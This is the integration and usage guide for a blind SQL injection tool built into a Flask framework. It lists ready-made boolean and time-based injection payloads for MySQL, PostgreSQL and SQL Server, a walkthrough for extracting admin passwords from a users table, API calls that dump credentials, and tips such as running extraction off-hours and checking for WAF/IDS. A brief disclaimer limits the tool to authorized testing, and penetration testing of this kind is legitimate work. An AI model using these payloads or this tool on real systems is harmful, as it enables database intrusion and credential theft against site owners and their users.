# Blind SQL Injector - Integration Guide

A professional blind SQL injection tool with boolean-based and time-based extraction capabilities, integrated with your existing Flask automation framework.

## Files Included

1. **blindsql.py** - Core injection logic with parameter extraction and database queries
2. **blindsql.html** - Web interface (paste in templates/ folder)
3. **blindsql_routes.py** - Flask routes and task management (integrate into server.py)

## Quick Integration Steps

### Step 1: Add the HTML Template
```bash
cp blindsql.html /path/to/templates/blindsql.html
```

### Step 2: Copy Core Module
```bash
cp blindsql.py /path/to/your/project/
```

### Step 3: Integrate Routes into server.py

Add these imports at the top of `server.py`:
```python
from blindsql_routes import blindsql_bp
```

Register the blueprint after other tools (around line 30):
```python
app.register_blueprint(blindsql_bp)
```

### Step 4: Update Navigation (Optional)
Add a link to your navigation menu in the main template:
```html
<a href="/blindsql">Blind SQL Injector</a>
```

## Usage Guide

### 1. Paste Raw HTTP Request
Grab the request from Burp Suite or your proxy:
```
GET /filter?category=Gifts HTTP/2.0
Host: target.com
User-Agent: Mozilla/5.0
Cookie: TrackingId=x; session=abc123
```

### 2. Select Injection Point
The tool automatically detects parameters from:
- Query strings (?param=value)
- Headers (Cookie: param=value)
- POST bodies (form-data)

### 3. Configure Settings
- **Injection Type**: 
  - Boolean: Faster, more reliable (recommended)
  - Time-based: Use if boolean fails
- **Database Type**: Auto-detect or specify (MySQL, PostgreSQL, etc.)
- **True Indicator**: String that appears when query is TRUE

### 4. Choose Extraction Mode
- **Get Table Names**: Extract all table names from information_schema
- **Get Columns**: Extract column names from a specific table
- **Extract Data**: Extract actual data from table/column
- **Test Only**: Just verify the injection works

### 5. Run and Monitor
Click "Start" and watch the console for real-time progress. Results appear in the "Extracted Data" tab.

## Payload Examples

### Boolean-based (MySQL)
```sql
' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
' OR (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'--
' OR (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='p'--
```

### Time-based (MySQL)
```sql
' OR IF(1=1, SLEEP(5), 0)--
' OR IF((SELECT COUNT(*) FROM users)>5, SLEEP(5), 0)--
```

### Boolean-based (PostgreSQL)
```sql
' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
' OR (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'--
```

### Boolean-based (SQL Server)
```sql
' OR (SELECT COUNT(*) FROM sysobjects)>0--
' OR (SELECT SUBSTRING(name,1,1) FROM sysobjects LIMIT 1)='u'--
```

## Real-World Examples

### Example 1: Extract Admin Credentials
```
1. Injection Point: TrackingId (from cookie)
2. Injection Type: Boolean
3. Database: MySQL
4. True Indicator: "Welcome" (appears in response)
5. Mode: Extract Data
6. Table: users
7. Column: password
```

### Example 2: Enumerate Database
```
1. Injection Point: id (from query string)
2. Injection Type: Time-based
3. Database: Auto-detect
4. Mode: Get Table Names
```

### Example 3: Extract Column Names
```
1. Mode: Get Columns
2. Table Name: admin (or users, products, etc.)
```

## How It Works

### 1. Request Parsing
The tool parses raw HTTP requests to extract:
- Method, URL, headers, body
- All parameters (GET, POST, cookies, headers)

### 2. Parameter Injection
For each test payload, the tool:
- Injects into the selected parameter
- Preserves the rest of the request
- Sends actual HTTP requests to the target

### 3. Response Analysis
- **Boolean**: Checks if `true_indicator` string appears in response
- **Time**: Measures response time for SLEEP/WAITFOR delays

### 4. Blind Extraction
Uses binary search / character-by-character extraction:
```
Extracting password: 
Position 1: a,b,c...p ✓ → "p"
Position 2: a,b,c...a ✓ → "pa"
Position 3: a,b,c...s ✓ → "pas"
...continues until complete
```

## Supported Databases

| Database | Boolean | Time-based | Status |
|----------|---------|-----------|--------|
| MySQL    | ✓       | ✓         | Fully supported |
| PostgreSQL| ✓      | ✓         | Fully supported |
| SQL Server| ✓      | ✓         | Fully supported |
| SQLite   | ✓       | ✓         | Fully supported |
| Oracle   | ✓       | ✓         | Partially tested |

## Troubleshooting

### "Injection test failed"
1. Verify the true_indicator is correct
2. Try different indicators (check page source)
3. Try alternative payloads manually first
4. Verify parameter is actually injectable

### "No data extracted"
1. Database might use different information_schema
2. Try specifying database type explicitly
3. User permissions might be restricted
4. Check if error messages are suppressed

### Slow Extraction
1. Boolean-based is faster than time-based
2. Reduce max_length in code if targets are small
3. Consider running extraction during off-hours
4. Use larger charset to guess faster

### Request Formatting Issues
- Copy the entire raw request from Burp
- Include all headers
- Use `HTTP/1.1` or `HTTP/2.0` version
- Include empty line between headers and body

## Advanced Customization

### Custom Charset
Edit `BlindSQLInjector.extract_string()`:
```python
charset = string.ascii_lowercase + string.digits + "_@."
```

### Custom Payload Templates
Modify `_inject_payload()` method in blindsql.py to support additional injection techniques.

### Database-Specific Queries
Add custom queries in `get_table_names()` for databases without information_schema.

## Performance Tips

1. **Boolean > Time-based**: Boolean is 10-100x faster
2. **Charset optimization**: Use only needed characters
3. **Parallel extraction**: Modify code for concurrent character testing
4. **Cached results**: Tool caches detection results

## Legal & Safety

⚠️ **This tool is for authorized penetration testing only.**

- Only use on systems you own or have written permission to test
- Keep records of all testing activities
- Inform relevant teams about findings
- Follow your organization's policies
- Respect all applicable laws and regulations

## Common Injection Points

- URL parameters: `?id=1&category=x`
- Headers: `User-Agent:`, `X-Forwarded-For:`, `Referer:`
- Cookies: `session=`, `TrackingId=`, `auth=`
- POST data: `username=`, `email=`, `search=`

## Success Indicators

✓ You'll know it's working when:
- Console shows "Injection confirmed!"
- Table names start appearing
- Data extraction begins character-by-character
- Results populate in the "Extracted Data" tab

## Future Enhancements

- [ ] Support for stacked queries
- [ ] Automated database fingerprinting
- [ ] Error-based SQL injection
- [ ] Union-based extraction
- [ ] Multi-threaded parallel extraction
- [ ] Export results (CSV, JSON)
- [ ] Saved payloads library

## API Reference

### BlindSQLInjector Class

```python
injector = BlindSQLInjector(
    raw_request="GET /search?q=test...",
    injection_point="q",
    injection_type="boolean",
    true_indicator="results",
    database_type="mysql"
)

# Test if injectable
injector._test_payload("' OR '1'='1")

# Extract data
tables = injector.get_table_names()
columns = injector.get_columns("users")
data = injector.extract_data("users", "password")
```

## Support & Issues

- Check the console tab for detailed logs
- Verify request format matches Burp/Intruder output
- Try manual SQL injection first to confirm vulnerability
- Check target doesn't have WAF/IDS blocking requests

---

**Version**: 1.0  
**Last Updated**: 2026-05-31  
**Requires**: Python 3.7+, requests library
